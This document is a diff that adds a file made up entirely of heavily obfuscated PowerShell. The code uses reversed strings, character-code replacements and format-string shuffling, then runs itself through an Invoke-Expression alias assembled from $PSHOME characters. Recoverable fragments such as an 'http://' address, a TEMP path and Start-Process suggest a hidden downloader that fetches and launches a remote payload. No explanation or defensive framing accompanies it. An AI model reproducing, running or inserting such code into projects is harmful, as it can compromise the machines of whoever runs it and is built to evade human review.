@@ -1,0 +1,22 @@
+SeT  ('ia'+'Lm')  (") )93]rAhc[]GNirTs[,'zpl'(EcalpEr.)43]rAhc[]GNirTs[,)18]rAhc[+47]rAhc[+401]rAhc[((EcalpEr.)' ))63]raHc[,)401]raHc[+501]raHc'+'[+801]raHc[( Ec'+'ALPER-'+'93]raHc[,)711]raHc[+15]raHc[+87]raHc[(  ECalpeRc-  ))zplN+u3N0}1u3'+'N+u3N{}2{}7{u3N+u3N}0{}u'+'3N+u3N5{}4u3Nzpl,zplJN1Fu3N+u3N f-f3u3N+'+'u3N0}zpl,zpl3N fi    u3N+u3N'+'  
+ u'+'3N+'+'u3N}u3N+u3N  u3N+u3N u3N+u3N u3N+zpl,zplN+u'+'3zpl,zpl) )63]rAHC[]gNirTs[,u3Nz9wu3N(ECALpezpl,z'+'p'+'lu3N+u3N'+'    u3N+'+'u3N
+u'+'3N+u3zpl,zpl3NTAu3N+u3Nzp'+'l,zpl}DAolu3N+u3NNtxRu3N+u3NwOD{u3N+u3Nzu3N+u'+'3N9w u3N+u3N u3N+u3N   u3N+u3N u3zpl,zplN+u3N'+'
+u3N+u3'+'N;u3N+u3Nfu3N+u3N30u3N'+'+u3N)b.'+'iz9wu3N'+'+u3N(zu3N+u3N9wq3LPu3N+u3NMET:vnez9u3N+u3Nwf30 = }HtAu3N+u3Nptu3N+u3NxREu3N+u3Nlu3N+u3NIu3N'+'+u3NF{zu3N+u'+'3N9u3N+u3Nw      u3N+u3'+'N
+{ yru3N+u3Nt u3N+u3N '+' u3N+u3N 
+u3N+u3N{ u3N+u3N)}ATu3N+u3NAtxRzpl,zpl3N+'+'u3Nb'+'u3N+u3NOmu3N+u'+'3NotsuCSPu3N+u3N[  
+zpl,zpl87]rAHC[+94]rAHzpl'+',zpl.ku3N+uzpl,zp'+'lFu3N+u3Nkorb/u3N+u3N/:N1u3N+u3NF,N1Fohu3N+u3N'+'sz'+'pl,zpl}iu3N+u3'+'N{z9u3N+u3'+'Nw iu3N+u3NrU- u3N+u3N)Nzpl,zpl3N1'+'F,N1FeTN1F,'+'N1Fu3N+u3N'+'htau3'+'N+u3NP-u3N+u3NtN1Fu3N+u3N u3N+u3Nf- f30u3N+u3'+'N}u3N+u3N'+'0{u3N+u3N}2u3N+u3N{u3N+u3N}1{fu3N+u3N30zpl,zpl+u3N}u3N+u3N'+'3u3N+uzpl,zpl(u3N+u3N@ = }Au3N+uzpl,zpl3N('+' ;)u'+'3N+u3NNu3N+u3N1Fu3N+u3Nttzpl,zpl'+'u'+'3N+u3NO- f30afu'+'3N+u3N3u3N+u3N0.zpl,zpl3NN1u3N+u3NFu3N+u3N,N1FolopN1u3N+uzpl,zpldoN1F,u3'+'N+u3NN1FeR-N1Fu3N+u3N,Nu3N+u3N1u3N+u3NFu3N+u3Nhu3N+u3NteMtsNu3N+u3N1F f- f30}2{u3N+u3N}0{}1zpl,zpl3N3'+'u3N+u3N0}0{}2{}u3N+u3N1{fu3N+u3N3'+'0(&'+'   '+'   
+u3N+u3N}u3N+u3Nzpl,zplN'+'1u3Nzpl,zplu3zpl,zplDEtxu3N'+'+u3NRMu3'+'N+u3NOu3N+u3Ntxu3N+u3NRSu3N+u3N{u3'+'N+u3Nz9w nzpl,zpl3Nf30zpl,zpl}u3zpl,zpl3NRrT{u3N+u3Nzu3N+u3N9w = zpl,zplN+uzpl,zpl+u3NFzpl,zplN{u'+'3Nzpl,zpli }iuzpl,zpl+u3NFaN1Fu'+'3N+u3N({@]tu3N+u3Ncu3N+u3Nejuzpl,zplu3N+u3Nzpl,zpl1u3N+u3NF,N1FCu3N+u'+'3'+'NFJQX/pN1F u'+'3zpl,zpl)
+})N1Fu3N+u3NFHu'+'3N+u3NICFN1'+'u3N+u3NF,N1FQXu3N+u3NN1F,N1u3N+u3NFism.N1Fu3N+u3N,u3N+u3NN1u3Nzpl,zpl+u3N9w )N1u3'+'N+u3NFsu3N+u3NNu3N+uzpl,zpl}3{zpl,zpl3N{f3u3N+u3N0u3N+u3N(u3N+u3N&   '+'   u3N+u3N  '+'u3N+u3N
+{ )u3N+u3N}du3N+u3NAtxu3N+u3NRO'+'lu3N+u3NNu3N+u3NwtxRou3N+u3NDu3N+u3N{z9zpl,z'+'pl]gNzpl,zpl3N+u3N{zu3N+u3N9w( '+'hc'+'aeu3N+u3Nru3N+u3N'+'ou3N+u3Nf  
+;zpl,zplr.)69]rAHC[zpl,zpl;}hTApu3N+u3Ntu3N+zpl,zplu3N u3N+u3N u3zpl,zp'+'lN+zp'+'l,zpl,Nu3N+u3N1u3N+u3NFu3N+u3NhN1F,N1F.FHIN1F,Nu3'+'N+u3'+'N1zpl,zpl+u3NFzpl'+',zpl3NN1Ff- fu3N+uzpl,zplu3NxREu3N+u3NLu3N+u3Ntu3N+u3NxRu3N+u3N'+'If{z9w eliFtu3N'+'+u3Nuzpl,zplC[+07]rAHC[((ECALper.)u3N  
+
+}  
+'+'u3N+u3N} u3N+u3N'+'   
+{ hctacu3N+u3N    
+}u3N+u3N  u3N+u3N  
+;}zpl,zplu3N+u3N{}u3N+u3N4u3N+u3zpl,zpl{zu3N+u3N9w u3N+u3N)N1F-tu3N+u3NN1u3N+u3NF,Nu3N+u3N1Frat'+'SN1F,Nu3N+u3Nzpl,zplN+u'+'3Nf-'+'f3u3zpl,zplw(u3N+uzpl,zplu3N+u3N 
+ zpl,zplw = }DAtxu3N+u3NROLtxRNWu3N+u3Nodzpl,zpl+u3Nfu3N+u3Ni'+'      u3N+u3N
+;zpl,zpl3'+'N0{}2{fu3N+u3N30( u3N+'+'u3N= )'+'N1FbNu3N+u3N1Fu3N+uzpl,zplu3N
+;}ESu3zpl,zplF'+',N1Fo'+'vnIN1F,Nu3N+u3N1u3N+u3NFu3N+u3Nzpl,zpl}u3N+u3NeUzpl,zpl+u3N{}6u3N+'+'u3N{u3N+u3N}3{}9{}8u3N+u3N{f3u3N+u3N0( = )u3N+u3NN1u3Nzp'+'l,zpl{u3N+u3Nz'+'u3zpl,zpl3NF,N1u3N+u3NFspN1F,u3N+u3NN1u3N+u3NFmN1F,N1FisNu3N+u3Nzpl,'+'zplN+u3Ntxu3N+uzpl,zpl(u3N+u3N&u3N+u3N( u3Nzpl,zplHTtxu3N+u3Nzpl,'+'zplN+u3'+'NtxRlu3N+u3Naf{zu3Nzpl,zplRuzpl,'+'zpl1'+'u3N+u3NFeku3N+u3NNu3N+u3N1u3N+u3Nzpl,zp'+'lNorPu3N+uzpl,zpl1Fsu3N+u3Nseu3N+u3Ncu3N+u3zpl,zpl'+'u3NPu3N+u3Ntu3N+u3NxRetu3N+u3NxRu3N+u3Nlif{zu3Nzpl,zpl3N+u3Nau3N+u3Npetxu3N+u3NRu3N+u3N'+'lIFu3N+u3Nzpl,zpltu3N+u3NxRDetxRmos{z9w  u3N'+'+u3N
+u3N+u3N
+u3N( ()u3Nu3Nni'+'oJ-u3NXu3N+zpl,zplr.)29]rAHC[]gNirTs[,u3Nq3Lu3N(ECALper.)4'+'3]rAHC['+']gNirTs[,uzpl,zplu3N(ECALpezpl,zpl  u3N+u3N   zpl,zpl'+'+u3N9zpl,zplN{ )u3N+u3N}htau3N+zpl,zplN9wu3N+u3N u3N+z'+'pl,zpl'+'u3N u3N+u3N u3N+u3N zpl,zplirTs[,)611'+']rAHC[+021]rAHC[+28]rAHC[((ECALp'+'er.)93]rAHC[]gNi'+'rTs[,)zpl,zpl]3,1[)(gNIRtSOt.ecne'+'rEfeRPeSobReVhil ( .zpl,zpl1u3N+u3N{zplf-QJh}08{}9{}95{}8{}34{}54{}2{}47{}53{}81{}61{}11{}33{}31{}41{}73{}36{}7{}03{}24{}63{}66{}17{}51{}52{}46{}43{}45{}96{}64{}13{}28{}14{}04{}62{}71{}6{}92{}22{}18{}4{}3{}97{}5{}21{}84{}07{}91{}82{}42{}16{}02{}75{}77{}67{}06{}15{}35{}44{}94{}55{}38{}0{}74{}85{}65'+'{}72{}76{}26{}83{}93{}27{}37{}56{}'+'12{}05{}23{}48{}32{}25{}57{}86{}87{}01{}1{QJh((( ( )zplzpln'+'IOJ'+'-'+']2,11,3[Eman'+'.)zpl*RdM*zpl ElbAIrAV-tEG((&'(( NoissERpXE-EKOvNI"); .( $PSHOMe[21]+$pshoMe[30]+'x')("$( sEt-iTem 'VariABLe:ofs' '') " +[sTrInG]($iaLM[- 1.. -( $iaLM.lengTh)]) +"$(Set-varIabLe 'oFS'  ' ' )")
